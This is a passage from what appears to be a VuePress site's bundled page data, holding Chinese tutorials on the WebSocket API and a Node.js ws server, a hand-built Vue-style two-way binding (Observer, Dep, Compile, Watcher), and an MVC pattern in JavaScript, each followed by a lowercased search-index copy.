alert(\"数据发送中...\");\n};\n\n// 接收服务端数据时触发事件\nws.onmessage = function (evt) {\n  var received_msg = evt.data;\n  alert(\"数据已接收...\");\n};\n\n// 断开 web socket 连接成功触发事件\nws.onclose = function () {\n  alert(\"连接已关闭...\");\n};\n\n\n\n# WebSocket在服务器端实现\n\nWebSocket服务端的实现不受平台和开发语言的限制，只需要遵从WebSocket规范即可\n\n\n# Nodejs\n\n 1. 安装ws模块 ws是nodejs的一个WebSocket库，可以用来创建服务。\n    npm install ws\n 2. 在项目里面新建一个server.js，创建服务，指定8181端口，将收到的消息log出来。\n\nvar WebSocketServer = require('ws').Server,\nwss = new WebSocketServer({ port: 8181 });\nwss.on('connection', function (ws) {\n    console.log('index connected');\n    ws.on('message', function (message) {\n        console.log(message);\n    });\n});\n\n\n 3. 建立一个index.html在页面上建立一个WebSocket的连接。用send方法发送消息。\n\nvar ws = new WebSocket(\"ws://localhost:8181\");\n    ws.onopen = function (e) {\n        console.log('Connection to server opened');\n    }\n    function sendMessage() {\n        ws.send($('#message').val());\n    }\n\n\n\n# 案例\n\n实现一个即时通讯，多人聊天室",normalizedContent:"# websocket\n\nwebsocket 是 html5 开始提供的一种在单个 tcp 连接上进行全双工通讯的协议。\n\nwebsocket 其实是一个新协议，跟 http 协议基本没有关系，只是为了兼容现有浏览器的握手规范而已，也就是说它是 http 协议上的一种补充。\n\n\n# 解决的问题\n\nhttp 协议是一种无状态的、无连接的、单向的应用层协议。它采用了请求/响应模型。通信请求只能由客户端发起，服务端对请求做出应答处理。\n\n这种通信模型有一个弊端：http 协议无法实现服务器主动向客户端发起消息。\n\n这种单向请求的特点，注定了如果服务器有连续的状态变化，客户端要获知就非常麻烦。大多数 web 应用程序将通过频繁的异步javascript和xml（ajax）请求实现长轮询。轮询的效率低，非常浪费资源（因为必须不停连接，或者 http 连接始终打开）。\n\nwebsocket使得客户端和服务器之间的数据交换变得更加简单，允许服务端主动向客户端推送数据。在websocket api中，浏览器和服务器只需要完成一次握手，两者之间就直接可以创建持久性的连接，并进行双向数据传输。\n\n\n# websocket 如何工作\n\nweb浏览器和服务器都必须实现 websockets 协议来建立和维护连接。由于 websockets 连接长期存在，与典型的http连接不同，对服务器有重要的影响。\n\n基于多线程或多进程的服务器无法适用于 websockets，因为它旨在打开连接，尽可能快地处理请求，然后关闭连接。任何实际的 websockets 服务器端实现都需要一个异步服务器。\n\n\n# websocket在客户端实现\n\n在客户端，没有必要为 websockets 使用 javascript 库。实现 websockets 的 web 浏览器将通过 websockets 对象公开所有必需的客户端功能（主要指支持 html5 的浏览器）。\n\n\n# 客户端\n\n创建 websocket 对象\n\nvar socket = new websocket(url, [protocol] );\n\n\n第一个参数 url, 指定连接的 url。第二个参数 protocol 是可选的，指定了可接受的子协议。\n\n# websocket 属性\n\n属性               描述\nreadystate       只读属性 readystate 表示连接状态，可以是以下值：0 - 表示连接尚未建立。1 -\n                 表示连接已建立，可以进行通信。2 - 表示连接正在进行关闭。3 - 表示连接已经关闭或者连接不能打开。\nbufferedamount   只读属性 bufferedamount 已被 send() 放入正在队列中等待传输，但是还没有发出的 utf-8\n                 文本字节数。\n\n# websocket 方法\n\n方法名     描述\nsend    使用连接发送数据\nclose   关闭连接\n\n# websocket 事件\n\n事件名称      描述\nopen      连接建立时触发\nmessage   客户端接收服务端数据时触发\nerror     通信发生错误时触发\nclose     连接关闭时触发\n\n// 初始化一个 websocket 对象\nvar ws = new websocket(\"ws://localhost:9998/echo\");\n\n// 建立 web socket 连接成功触发事件\nws.onopen = function () {\n  // 使用 send() 方法发送数据\n  ws.send(\"发送数据\");\n  alert(\"数据发送中...\");\n};\n\n// 接收服务端数据时触发事件\nws.onmessage = function (evt) {\n  var received_msg = evt.data;\n  alert(\"数据已接收...\");\n};\n\n// 断开 web socket 连接成功触发事件\nws.onclose = function () {\n  alert(\"连接已关闭...\");\n};\n\n\n\n# websocket在服务器端实现\n\nwebsocket服务端的实现不受平台和开发语言的限制，只需要遵从websocket规范即可\n\n\n# nodejs\n\n 1. 安装ws模块 ws是nodejs的一个websocket库，可以用来创建服务。\n    npm install ws\n 2. 在项目里面新建一个server.js，创建服务，指定8181端口，将收到的消息log出来。\n\nvar websocketserver = require('ws').server,\nwss = new websocketserver({ port: 8181 });\nwss.on('connection', function (ws) {\n    console.log('index connected');\n    ws.on('message', function (message) {\n        console.log(message);\n    });\n});\n\n\n 3. 建立一个index.html在页面上建立一个websocket的连接。用send方法发送消息。\n\nvar ws = new websocket(\"ws://localhost:8181\");\n    ws.onopen = function (e) {\n        console.log('connection to server opened');\n    }\n    function sendmessage() {\n        ws.send($('#message').val());\n    }\n\n\n\n# 案例\n\n实现一个即时通讯，多人聊天室",charsets:{cjk:!0}},{title:"VUE实现",frontmatter:{},regularPath:"/Javascript/Javascript%E6%89%A9%E5%B1%95%E6%93%8D%E4%BD%9C/VUE%E5%AE%9E%E7%8E%B0.html",relativePath:"Javascript/Javascript扩展操作/VUE实现.md",key:"v-240eb8d6",path:"/Javascript/Javascript%E6%89%A9%E5%B1%95%E6%93%8D%E4%BD%9C/VUE%E5%AE%9E%E7%8E%B0.html",headers:[{level:2,title:"数据处理(数据双向绑定)",slug:"数据处理-数据双向绑定",normalizedTitle:"数据处理(数据双向绑定)",charIndex:29},{level:2,title:"实现mvvm",slug:"实现mvvm",normalizedTitle:"实现mvvm",charIndex:830},{level:3,title:"数据监听器",slug:"数据监听器",normalizedTitle:"数据监听器",charIndex:848},{level:3,title:"指令解析器",slug:"指令解析器",normalizedTitle:"指令解析器",charIndex:854},{level:3,title:"Watcher",slug:"watcher",normalizedTitle:"watcher",charIndex:860},{level:3,title:"整合",slug:"整合",normalizedTitle:"整合",charIndex:7518}],headersStr:"数据处理(数据双向绑定) 实现mvvm 数据监听器 指令解析器 Watcher 整合",content:"# VUE实现\n\nVue是一个典型的MVVM框架\n\n\n# 数据处理(数据双向绑定)\n\n双向数据绑定就是在单向绑定的基础上给可输入元素（input、textare等）添加了change(input)事件，来动态修改model和 view。\nvue实现对数据的双向绑定，通过对数据劫持结合发布者-订阅者模式实现的。\nangular.js 是通过脏值检测的方式比对数据是否有变更，来决定是否更新视图。\n\nvue通过Object.defineProperty来实现数据劫持，会对数据对象每个属性添加对应的get和set方法，对数据进行读取和赋值操作就分别调用get和set方法。\n\ndefineProperty方法是这里的重点，需要了解请移步Object对象。\n\n<body>\n    <input type=\"text\" id=\"input\">\n    <span id=\"span\"></span>\n</body>\n<script>\n    var input=document.querySelector('#input');\n    var span=document.querySelector('#span');\n    var obj={};\n    console.log(Array.from(input.attributes));\n    Object.defineProperty(obj,'hello',{\n        set(newValue){\n            input.value=newValue;\n            span.innerHTML=newValue;\n        }\n    })\n    document.addEventListener('keyup',function(e){\n        obj.hello=e.target.value;\n    })\n<\/script>\n\n\n\n# 实现mvvm\n\n实现mvvm需要实现数据监听器+指令解析器+Watcher\n\n\n# 数据监听器\n\n数据监听器Observer，能够对数据对象的所有属性进行监听，如有变动可拿到最新值并通知订阅者\n我们利用Obeject.defineProperty()来监听属性变动，需要observe的数据对象进行递归遍历，包括子属性对象的属性，都加上 setter和getter这样的话，给这个对象的某个值赋值，就会触发setter，那么就能监听到了数据变化。\n\nvar data = {name: 'kindeng'};\nobserve(data);\ndata.name = 'dmq'; // 哈哈哈，监听到值变化了 kindeng --\x3e dmq\n\nfunction observe(data) {\n    if (!data || typeof data !== 'object') {\n        return;\n    }\n    // 取出所有属性遍历\n    Object.keys(data).forEach(function(key) {         \n        defineReactive(data, key, data[key]);\n    });\n};\n\nfunction defineReactive(data, key, val) {        //给对象上的值添加get和set\n    observe(val); // 监听子属性\n    Object.defineProperty(data, key, {\n        enumerable: true, // 可枚举\n        configurable: false, // 不能再define\n        get: function() {\n            return val;\n        },\n        set: function(newVal) {\n            console.log('哈哈哈，监听到值变化了 ', val, ' --\x3e ', newVal);\n            val = newVal;\n        }\n    });\n}\n\n\n可以监听到每个数据的变化，我们再把这些变化通知给订阅者，需要实现一个消息订阅器，很简单，维护一个数组，用来收集订阅者，数据变动触发notify，再调用订阅者的update方法。\n\nfunction defineReactive(data, key, val) {\n    var dep = new Dep();           //给上面的代码添加Dep实例\n    observe(val); // 监听子属性\n\n    Object.defineProperty(data, key, {\n        // ... 省略\n        set: function(newVal) {\n            if (val === newVal) return;\n            console.log('哈哈哈，监听到值变化了 ', val, ' --\x3e ', newVal);\n            val = newVal;\n            dep.notify(); // 通知所有订阅者\n        }\n    });\n}\nfunction Dep() {\n    this.subs = [];\n}\nDep.prototype = {\n    addSub: function(sub) {\n        this.subs.push(sub);\n    },\n    notify: function() {\n        this.subs.forEach(function(sub) {\n            sub.update();\n        });\n    }\n};\n\n\n接着往往订阅器添加订阅者，订阅者应该是Watcher, 而且var dep = new Dep();是在 defineReactive方法内部定义的，所以想通过dep添加订阅者，就需要在闭包内操作，所以我们可以在 getter里面操作\n\nObject.defineProperty(data, key, {\n    get: function() {\n        // 由于需要在闭包内添加watcher，所以通过Dep定义一个全局target属性，暂存watcher, 添加完移除\n        Dep.target && dep.addDep(Dep.target);\n        return val;\n    }\n});\n\n// Watcher.js\nWatcher.prototype = {\n    get: function(key) {\n        Dep.target = this;\n        this.value = data[key];    // 这里会触发属性的getter，从而添加订阅者\n        Dep.target = null;\n    }\n}\n\n\nObserver(数据监听器)就已经具备了监听数据和数据变化通知订阅者的功能。\n\n\n# 指令解析器\n\n对每个元素节点的指令进行扫描和解析，根据指令模板替换数据，以及绑定相应的更新函数。简单来说就是把我们写的指令解析出来，然后进行相应的操作。\n\n遍历解析的过程有多次操作dom节点，为提高性能和效率，会先将跟节点el转换成文档碎片fragment进行解析编译操作，解析完成，再将fragment添加回原来的真实dom节点中\n\nfunction Compile(el) {\n    this.$el = this.isElementNode(el) ? el : document.querySelector(el);\n    if (this.$el) {\n        this.$fragment = this.node2Fragment(this.$el);\n        this.init();          \n        this.$el.appendChild(this.$fragment);\n    }\n}\nCompile.prototype = {\n    init: function() { this.compileElement(this.$fragment); },     \n    node2Fragment: function(el) {\n        var fragment = document.createDocumentFragment(), child;\n        // 将原生节点拷贝到fragment\n        while (child = el.firstChild) {\n            fragment.appendChild(child);\n        }\n        return fragment;\n    },\n    //compileElement方法将遍历所有节点及其子节点，进行扫描解析编译，调用对应的指令渲染函数进行数据渲染，并调用对应的指令更新函数进行绑定\n    compileElement: function(el) {          \n        var childNodes = el.childNodes, me = this;\n        [].slice.call(childNodes).forEach(function(node) {\n            var text = node.textContent;\n            var reg = /\\{\\{(.*)\\}\\}/;    // 表达式文本\n            // 按元素节点方式编译\n            if (me.isElementNode(node)) {\n                me.compile(node);\n            } else if (me.isTextNode(node) && reg.test(text)) {\n                me.compileText(node, RegExp.$1);\n            }\n            // 遍历编译子节点\n            if (node.childNodes && node.childNodes.length) {\n                me.compileElement(node);\n            }\n        });\n    },\n    compile: function(node) {\n        var nodeAttrs = node.attributes, me = this;\n        [].slice.call(nodeAttrs).forEach(function(attr) {\n            // 规定：指令以 v-xxx 命名\n            // 如 <span v-text=\"content\"></span> 中指令为 v-text\n            var attrName = attr.name;    // v-text\n            if (me.isDirective(attrName)) {\n                var exp = attr.value; // content\n                var dir = attrName.substring(2);    // text\n                if (me.isEventDirective(dir)) {\n                    // 事件指令, 如 v-on:click\n                    compileUtil.eventHandler(node, me.$vm, exp, dir);\n                } else {\n                    // 普通指令\n                    compileUtil[dir] && compileUtil[dir](node, me.$vm, exp);\n                }\n            }\n        });\n    }\n};\n\n// 指令处理集合\nvar compileUtil = {\n    text: function(node, vm, exp) {\n        this.bind(node, vm, exp, 'text');\n    },\n    // ...省略\n    bind: function(node, vm, exp, dir) {\n        var updaterFn = updater[dir + 'Updater'];\n        // 第一次初始化视图\n        updaterFn && updaterFn(node, vm[exp]);\n        // 实例化订阅者，此操作会在对应的属性消息订阅器中添加了该订阅者watcher\n        new Watcher(vm, exp, function(value, oldValue) {\n            // 一旦属性值有变化，会收到通知执行此更新函数，更新视图\n            updaterFn && updaterFn(node, value, oldValue);\n        });\n    }\n};\n\n// 更新函数\nvar updater = {\n    textUpdater: function(node, value) {\n        node.textContent = typeof value == 'undefined' ? '' : value;\n    }\n};\n\n\n通过递归遍历保证了每个节点及子节点都会解析编译到，监听数据、绑定更新函数的处理是在compileUtil.bind()这个方法中，通过new Watcher()添加回调来接收数据变化的通知\n\n\n# Watcher\n\nWatcher订阅者作为Observer和Compile之间通信的桥梁，主要做的事情是:\n\n 1. 在自身实例化时往属性订阅器(dep)里面添加自己\n 2. 自身必须有一个update()方法\n 3. 待属性变动dep.notice()通知时，能调用自身的update()方法，并触发Compile中绑定的回调。\n\nfunction Watcher(vm, exp, cb) {\n    this.cb = cb;\n    this.vm = vm;\n    this.exp = exp;\n    // 此处为了触发属性的getter，从而在dep添加自己，结合Observer更易理解\n    this.value = this.get();\n}\nWatcher.prototype = {\n    update: function() {\n        this.run();    // 属性值变化收到通知\n    },\n    run: function() {\n        var value = this.get(); // 取到最新值\n        var oldVal = this.value;\n        if (value !== oldVal) {\n            this.value = value;\n            this.cb.call(this.vm, value, oldVal); // 执行Compile中绑定的回调，更新视图\n        }\n    },\n    get: function() {\n        Dep.target = this;    // 将当前订阅者指向自己\n        var value = this.vm[exp];    // 触发getter，添加自己到属性订阅器中\n        Dep.target = null;    // 添加完毕，重置\n        return value;\n    }\n};\n// 这里再次列出Observer和Dep，方便理解\nObject.defineProperty(data, key, {\n    get: function() {\n        // 由于需要在闭包内添加watcher，所以可以在Dep定义一个全局target属性，暂存watcher, 添加完移除\n        Dep.target && dep.addDep(Dep.target);\n        return val;\n    }\n    // ... 省略\n});\nDep.prototype = {\n    notify: function() {\n        this.subs.forEach(function(sub) {\n            sub.update(); // 调用订阅者的update方法，通知变化\n        });\n    }\n};\n\n\n实例化Watcher的时候，调用get()方法，通过Dep.target = watcherInstance标记订阅者是当前watcher实例，强行触发属性定义的getter方法，getter方法执行的时候，就会在属性的订阅器dep添加当前watcher实例，从而在属性值有变化的时候，watcherInstance就能收到更新通知。\n\n\n# 整合\n\n使用Vue作为数据绑定的入口，整合Observer、Compile和Watcher三者，通过Observer来监听自己的model数据变化，通过Compile来解析编译模板指令，最终利用Watcher搭起Observer和Compile之间的通信桥梁，达到数据变化 -> 视图更新；视图交互变化(input) -> 数据model变更的双向绑定效果。\n\nfunction Vue(options) {\n    this.$options = options;\n    var data = this._data = this.$options.data, me = this;\n    // 属性代理，实现 vm.xxx -> vm._data.xxx\n    Object.keys(data).forEach(function(key) {\n        me._proxy(key);\n    });\n    observe(data, this);\n    this.$compile = new Compile(options.el || document.body, this)\n}\n\nVue.prototype = {\n    _proxy: function(key) {\n        var me = this;\n        Object.defineProperty(me, key, {\n            configurable: false,\n            enumerable: true,\n            get: function proxyGetter() {\n                return me._data[key];\n            },\n            set: function proxySetter(newVal) {\n                me._data[key] = newVal;\n            }\n        });\n    }\n};\n\n\n主要还是利用了Object.defineProperty()这个方法来劫持了vm实例对象的属性的读写权，使读写vm实例的属性转成读写了vm._data的属性值",normalizedContent:"# vue实现\n\nvue是一个典型的mvvm框架\n\n\n# 数据处理(数据双向绑定)\n\n双向数据绑定就是在单向绑定的基础上给可输入元素（input、textare等）添加了change(input)事件，来动态修改model和 view。\nvue实现对数据的双向绑定，通过对数据劫持结合发布者-订阅者模式实现的。\nangular.js 是通过脏值检测的方式比对数据是否有变更，来决定是否更新视图。\n\nvue通过object.defineproperty来实现数据劫持，会对数据对象每个属性添加对应的get和set方法，对数据进行读取和赋值操作就分别调用get和set方法。\n\ndefineproperty方法是这里的重点，需要了解请移步object对象。\n\n<body>\n    <input type=\"text\" id=\"input\">\n    <span id=\"span\"></span>\n</body>\n<script>\n    var input=document.queryselector('#input');\n    var span=document.queryselector('#span');\n    var obj={};\n    console.log(array.from(input.attributes));\n    object.defineproperty(obj,'hello',{\n        set(newvalue){\n            input.value=newvalue;\n            span.innerhtml=newvalue;\n        }\n    })\n    document.addeventlistener('keyup',function(e){\n        obj.hello=e.target.value;\n    })\n<\/script>\n\n\n\n# 实现mvvm\n\n实现mvvm需要实现数据监听器+指令解析器+watcher\n\n\n# 数据监听器\n\n数据监听器observer，能够对数据对象的所有属性进行监听，如有变动可拿到最新值并通知订阅者\n我们利用obeject.defineproperty()来监听属性变动，需要observe的数据对象进行递归遍历，包括子属性对象的属性，都加上 setter和getter这样的话，给这个对象的某个值赋值，就会触发setter，那么就能监听到了数据变化。\n\nvar data = {name: 'kindeng'};\nobserve(data);\ndata.name = 'dmq'; // 哈哈哈，监听到值变化了 kindeng --\x3e dmq\n\nfunction observe(data) {\n    if (!data || typeof data !== 'object') {\n        return;\n    }\n    // 取出所有属性遍历\n    object.keys(data).foreach(function(key) {         \n        definereactive(data, key, data[key]);\n    });\n};\n\nfunction definereactive(data, key, val) {        //给对象上的值添加get和set\n    observe(val); // 监听子属性\n    object.defineproperty(data, key, {\n        enumerable: true, // 可枚举\n        configurable: false, // 不能再define\n        get: function() {\n            return val;\n        },\n        set: function(newval) {\n            console.log('哈哈哈，监听到值变化了 ', val, ' --\x3e ', newval);\n            val = newval;\n        }\n    });\n}\n\n\n可以监听到每个数据的变化，我们再把这些变化通知给订阅者，需要实现一个消息订阅器，很简单，维护一个数组，用来收集订阅者，数据变动触发notify，再调用订阅者的update方法。\n\nfunction definereactive(data, key, val) {\n    var dep = new dep();           //给上面的代码添加dep实例\n    observe(val); // 监听子属性\n\n    object.defineproperty(data, key, {\n        // ... 省略\n        set: function(newval) {\n            if (val === newval) return;\n            console.log('哈哈哈，监听到值变化了 ', val, ' --\x3e ', newval);\n            val = newval;\n            dep.notify(); // 通知所有订阅者\n        }\n    });\n}\nfunction dep() {\n    this.subs = [];\n}\ndep.prototype = {\n    addsub: function(sub) {\n        this.subs.push(sub);\n    },\n    notify: function() {\n        this.subs.foreach(function(sub) {\n            sub.update();\n        });\n    }\n};\n\n\n接着往往订阅器添加订阅者，订阅者应该是watcher, 而且var dep = new dep();是在 definereactive方法内部定义的，所以想通过dep添加订阅者，就需要在闭包内操作，所以我们可以在 getter里面操作\n\nobject.defineproperty(data, key, {\n    get: function() {\n        // 由于需要在闭包内添加watcher，所以通过dep定义一个全局target属性，暂存watcher, 添加完移除\n        dep.target && dep.adddep(dep.target);\n        return val;\n    }\n});\n\n// watcher.js\nwatcher.prototype = {\n    get: function(key) {\n        dep.target = this;\n        this.value = data[key];    // 这里会触发属性的getter，从而添加订阅者\n        dep.target = null;\n    }\n}\n\n\nobserver(数据监听器)就已经具备了监听数据和数据变化通知订阅者的功能。\n\n\n# 指令解析器\n\n对每个元素节点的指令进行扫描和解析，根据指令模板替换数据，以及绑定相应的更新函数。简单来说就是把我们写的指令解析出来，然后进行相应的操作。\n\n遍历解析的过程有多次操作dom节点，为提高性能和效率，会先将跟节点el转换成文档碎片fragment进行解析编译操作，解析完成，再将fragment添加回原来的真实dom节点中\n\nfunction compile(el) {\n    this.$el = this.iselementnode(el) ? el : document.queryselector(el);\n    if (this.$el) {\n        this.$fragment = this.node2fragment(this.$el);\n        this.init();          \n        this.$el.appendchild(this.$fragment);\n    }\n}\ncompile.prototype = {\n    init: function() { this.compileelement(this.$fragment); },     \n    node2fragment: function(el) {\n        var fragment = document.createdocumentfragment(), child;\n        // 将原生节点拷贝到fragment\n        while (child = el.firstchild) {\n            fragment.appendchild(child);\n        }\n        return fragment;\n    },\n    //compileelement方法将遍历所有节点及其子节点，进行扫描解析编译，调用对应的指令渲染函数进行数据渲染，并调用对应的指令更新函数进行绑定\n    compileelement: function(el) {          \n        var childnodes = el.childnodes, me = this;\n        [].slice.call(childnodes).foreach(function(node) {\n            var text = node.textcontent;\n            var reg = /\\{\\{(.*)\\}\\}/;    // 表达式文本\n            // 按元素节点方式编译\n            if (me.iselementnode(node)) {\n                me.compile(node);\n            } else if (me.istextnode(node) && reg.test(text)) {\n                me.compiletext(node, regexp.$1);\n            }\n            // 遍历编译子节点\n            if (node.childnodes && node.childnodes.length) {\n                me.compileelement(node);\n            }\n        });\n    },\n    compile: function(node) {\n        var nodeattrs = node.attributes, me = this;\n        [].slice.call(nodeattrs).foreach(function(attr) {\n            // 规定：指令以 v-xxx 命名\n            // 如 <span v-text=\"content\"></span> 中指令为 v-text\n            var attrname = attr.name;    // v-text\n            if (me.isdirective(attrname)) {\n                var exp = attr.value; // content\n                var dir = attrname.substring(2);    // text\n                if (me.iseventdirective(dir)) {\n                    // 事件指令, 如 v-on:click\n                    compileutil.eventhandler(node, me.$vm, exp, dir);\n                } else {\n                    // 普通指令\n                    compileutil[dir] && compileutil[dir](node, me.$vm, exp);\n                }\n            }\n        });\n    }\n};\n\n// 指令处理集合\nvar compileutil = {\n    text: function(node, vm, exp) {\n        this.bind(node, vm, exp, 'text');\n    },\n    // ...省略\n    bind: function(node, vm, exp, dir) {\n        var updaterfn = updater[dir + 'updater'];\n        // 第一次初始化视图\n        updaterfn && updaterfn(node, vm[exp]);\n        // 实例化订阅者，此操作会在对应的属性消息订阅器中添加了该订阅者watcher\n        new watcher(vm, exp, function(value, oldvalue) {\n            // 一旦属性值有变化，会收到通知执行此更新函数，更新视图\n            updaterfn && updaterfn(node, value, oldvalue);\n        });\n    }\n};\n\n// 更新函数\nvar updater = {\n    textupdater: function(node, value) {\n        node.textcontent = typeof value == 'undefined' ? '' : value;\n    }\n};\n\n\n通过递归遍历保证了每个节点及子节点都会解析编译到，监听数据、绑定更新函数的处理是在compileutil.bind()这个方法中，通过new watcher()添加回调来接收数据变化的通知\n\n\n# watcher\n\nwatcher订阅者作为observer和compile之间通信的桥梁，主要做的事情是:\n\n 1. 在自身实例化时往属性订阅器(dep)里面添加自己\n 2. 自身必须有一个update()方法\n 3. 待属性变动dep.notice()通知时，能调用自身的update()方法，并触发compile中绑定的回调。\n\nfunction watcher(vm, exp, cb) {\n    this.cb = cb;\n    this.vm = vm;\n    this.exp = exp;\n    // 此处为了触发属性的getter，从而在dep添加自己，结合observer更易理解\n    this.value = this.get();\n}\nwatcher.prototype = {\n    update: function() {\n        this.run();    // 属性值变化收到通知\n    },\n    run: function() {\n        var value = this.get(); // 取到最新值\n        var oldval = this.value;\n        if (value !== oldval) {\n            this.value = value;\n            this.cb.call(this.vm, value, oldval); // 执行compile中绑定的回调，更新视图\n        }\n    },\n    get: function() {\n        dep.target = this;    // 将当前订阅者指向自己\n        var value = this.vm[exp];    // 触发getter，添加自己到属性订阅器中\n        dep.target = null;    // 添加完毕，重置\n        return value;\n    }\n};\n// 这里再次列出observer和dep，方便理解\nobject.defineproperty(data, key, {\n    get: function() {\n        // 由于需要在闭包内添加watcher，所以可以在dep定义一个全局target属性，暂存watcher, 添加完移除\n        dep.target && dep.adddep(dep.target);\n        return val;\n    }\n    // ... 省略\n});\ndep.prototype = {\n    notify: function() {\n        this.subs.foreach(function(sub) {\n            sub.update(); // 调用订阅者的update方法，通知变化\n        });\n    }\n};\n\n\n实例化watcher的时候，调用get()方法，通过dep.target = watcherinstance标记订阅者是当前watcher实例，强行触发属性定义的getter方法，getter方法执行的时候，就会在属性的订阅器dep添加当前watcher实例，从而在属性值有变化的时候，watcherinstance就能收到更新通知。\n\n\n# 整合\n\n使用vue作为数据绑定的入口，整合observer、compile和watcher三者，通过observer来监听自己的model数据变化，通过compile来解析编译模板指令，最终利用watcher搭起observer和compile之间的通信桥梁，达到数据变化 -> 视图更新；视图交互变化(input) -> 数据model变更的双向绑定效果。\n\nfunction vue(options) {\n    this.$options = options;\n    var data = this._data = this.$options.data, me = this;\n    // 属性代理，实现 vm.xxx -> vm._data.xxx\n    object.keys(data).foreach(function(key) {\n        me._proxy(key);\n    });\n    observe(data, this);\n    this.$compile = new compile(options.el || document.body, this)\n}\n\nvue.prototype = {\n    _proxy: function(key) {\n        var me = this;\n        object.defineproperty(me, key, {\n            configurable: false,\n            enumerable: true,\n            get: function proxygetter() {\n                return me._data[key];\n            },\n            set: function proxysetter(newval) {\n                me._data[key] = newval;\n            }\n        });\n    }\n};\n\n\n主要还是利用了object.defineproperty()这个方法来劫持了vm实例对象的属性的读写权，使读写vm实例的属性转成读写了vm._data的属性值",charsets:{cjk:!0}},{title:"javascript中的MVC",frontmatter:{},regularPath:"/Javascript/Javascript%E6%89%A9%E5%B1%95%E6%93%8D%E4%BD%9C/javascript%E4%B8%AD%E7%9A%84MVC.html",relativePath:"Javascript/Javascript扩展操作/javascript中的MVC.md",key:"v-2876cb51",path:"/Javascript/Javascript%E6%89%A9%E5%B1%95%E6%93%8D%E4%BD%9C/javascript%E4%B8%AD%E7%9A%84MVC.html",headers:[{level:3,title:"MVC的基础是观察者模式，这是实现model和view同步的关键",slug:"mvc的基础是观察者模式-这是实现model和view同步的关键",normalizedTitle:"mvc的基础是观察者模式，这是实现model和view同步的关键",charIndex:250},{level:3,title:"实现controller，将绑定从逻辑代码中解耦",slug:"实现controller-将绑定从逻辑代码中解耦",normalizedTitle:"实现controller，将绑定从逻辑代码中解耦",charIndex:1373},{level:3,title:"整合代码",slug:"整合代码",normalizedTitle:"整合代码",charIndex:2165}],headersStr:"MVC的基础是观察者模式，这是实现model和view同步的关键 实现controller，将绑定从逻辑代码中解耦 整合代码",content:"# javascript中的MVC\n\nMVC 是一种使用 MVC（Model View Controller 模型-视图-控制器）设计创建 Web 应用程序的模式：\n\n * Model（模型）是应用程序中用于处理应用程序数据逻辑的部分，通常模型对象负责在数据库中存取数据。\n * View（视图）是应用程序中处理数据显示的部分，通常视图是依据模型数据创建的。\n * Controller（控制器）是应用程序中处理用户交互的部分，通常控制器负责从视图读取数据，控制用户输入，并向模型发送数据。\n\n\n# MVC的基础是观察者模式，这是实现model和view同步的关键\n\n借助观察者模式，实现在调用model的set方法改变其值的时候，模板也同步更新，但这样的实现却很别扭，因为需要手动监听model值的改变（通过watch方法）并传入一个回调函数，在使用binding方法，绑定model和view\n\n<div id=\"div1\"></div>\n<div id=\"div2\"></div>\n<script>\n\tfunction Model(value) {\n\t    this._value = typeof value === 'undefined' ? '' : value;\n\t    this._listeners = [];\n\t}\n\tModel.prototype.set = function (value) {\n\t    var self = this;\n\t    self._value = value;\n\t    // model中的值改变时，应通知注册过的回调函数\n\t    // 按照Javascript事件处理的一般机制，我们异步地调用回调函数\n\t    // 如果觉得setTimeout影响性能，也可以采用requestAnimationFrame\n\t    setTimeout(function () {\n\t        self._listeners.forEach(function (listener) {\n\t            listener.call(self, value);\n\t        });\n\t\t});\n\t};\n\tModel.prototype.watch = function (listener) {\n\t    // 注册监听的回调函数\n\t    this._listeners.push(listener);\n\t};\n\tModel.prototype.binding = function (node) {\n\t    // 将watch的逻辑和通用的回调函数放到这里\n\t    this.watch(function (value) {\n\t        node.innerHTML = value;\n\t    });\n\t};\n\n\n  var model = new Model();\n  model.binding(document.getElementById('div1'));\n  model.binding(document.getElementById('div2'));\n  model.set('this is a div');\n<\/script>\n\n\n\n# 实现controller，将绑定从逻辑代码中解耦\n\n<div id=\"div1\" bind=\"model1\"></div>\n<div id=\"div2\" bind=\"model1\"></div>\n<script type=\"text/javascript\">\n  function Controller(callback) {\n    var models = {};\n    // 找到所有有bind属性的元素\n    var views = document.querySelectorAll('[bind]');\n    // 将views处理为普通数组\n    views = Array.prototype.slice.call(views, 0);\n    views.forEach(function (view) {\n        var modelName = view.getAttribute('bind');\n        // 取出或新建该元素所绑定的model\n        models[modelName] = models[modelName] || new Model();\n        // 完成该元素和指定model的绑定\n        models[modelName].binding(view);\n    });\n    // 调用controller的具体逻辑，将models传入，方便业务处理\n    callback.call(this, models);\n  }\n  new Controller(function (models) {\n      var model1 = models.model1;\n      model1.set('this is a div');\n  });\n<\/script>\n\n\n\n# 整合代码\n\nfunction Model(value) {\n    this._value = typeof value === 'undefined' ? '' : value;\n    this._listeners = [];\n}\nModel.prototype.set = function (value) {\n    var self = this;\n    self._value = value;\n    setTimeout(function () {\n        self._listeners.forEach(function (listener) {\n            listener.call(self, value);\n        });\n    });\n};\nModel.prototype.watch = function (listener) {\n    this._listeners.push(listener);\n};\nModel.prototype.binding = function (node) {\n    this.watch(function (value) {\n        node.innerHTML = value;\n    });\n};\nfunction Controller(callback) {\n    var models = {};\n    var views = Array.prototype.slice.call(document.querySelectorAll('[bind]'), 0);\n    views.forEach(function (view) {\n        var modelName = view.getAttribute('bind');\n        (models[modelName] = models[modelName] || new Model()).binding(view);\n    });\n    callback.call(this, models);\n}\n\n\n# 简单使用\n\n<span bind=\"hour\"></span> : <span bind=\"minute\"></span> : <span bind=\"second\"></span>\n<script type=\"text/javascript\">\n// controller:\nnew Controller(function (models) {\n    function setTime() {\n        var date = new Date();\n        models.hour.set(date.getHours());\n        models.minute.set(date.getMinutes());\n        models.second.set(date.getSeconds());\n    }\n    setTime();\n    setInterval(setTime, 1000);\n});\n<\/script>\n\n\ncontroller中只负责更新model的逻辑，和view完全解耦；而view和model的绑定是通过view中的属性和框架中controller的初始化代码完成的，也没有出现在业务逻辑中；至于view的更新，也是通过框架中的观察者模式实现的。\n\n在简单的系统中应用MVC模式，会增加结构的复杂性，并且降低效率",normalizedContent:"# javascript中的mvc\n\nmvc 是一种使用 mvc（model view controller 模型-视图-控制器）设计创建 web 应用程序的模式：\n\n * model（模型）是应用程序中用于处理应用程序数据逻辑的部分，通常模型对象负责在数据库中存取数据。\n * view（视图）是应用程序中处理数据显示的部分，通常视图是依据模型数据创建的。\n * controller（控制器）是应用程序中处理用户交互的部分，通常控制器负责从视图读取数据，控制用户输入，并向模型发送数据。\n\n\n# 